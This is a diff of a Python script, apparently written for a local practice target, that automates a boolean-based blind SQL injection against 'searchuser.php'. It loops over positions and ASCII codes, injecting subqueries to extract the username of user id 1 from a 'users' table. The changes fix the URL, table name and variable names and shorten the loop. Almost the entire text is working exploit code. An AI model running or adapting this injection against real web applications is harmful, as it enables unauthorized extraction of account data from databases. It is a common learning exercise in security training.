@@ -16,8 +16,8 @@ signal.signal(signal.SIGINT, def_handler)
 
 # Variables globales
 
-main_url = "http://127.0.0.1/searchusers.php"
-characteres = string.printable
+main_url = "http://127.0.0.1/searchuser.php"
+characters = string.printable
 
 def makeSQLI():
     p1 = log.progress("Fuerza bruta")
@@ -29,13 +29,13 @@ def makeSQLI():
 
     extracted_info = ""
 
-    for position in range(1, 150):
+    for position in range(1, 50):
         for character in range(33, 126):
-            sql_url = main_url + "?id=9 or (select(select ascii(substring(username, %d, 1)) from user where id =1)=%d)" % (position, character)
+            sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id = 1)=%d)" % (position, character)
             
-            p1.status(sql_url)
+            p1.status(sqli_url)
 
-            r = requests.get(sql_url)
+            r = requests.get(sqli_url)
 
 
             if r.status_code == 200:
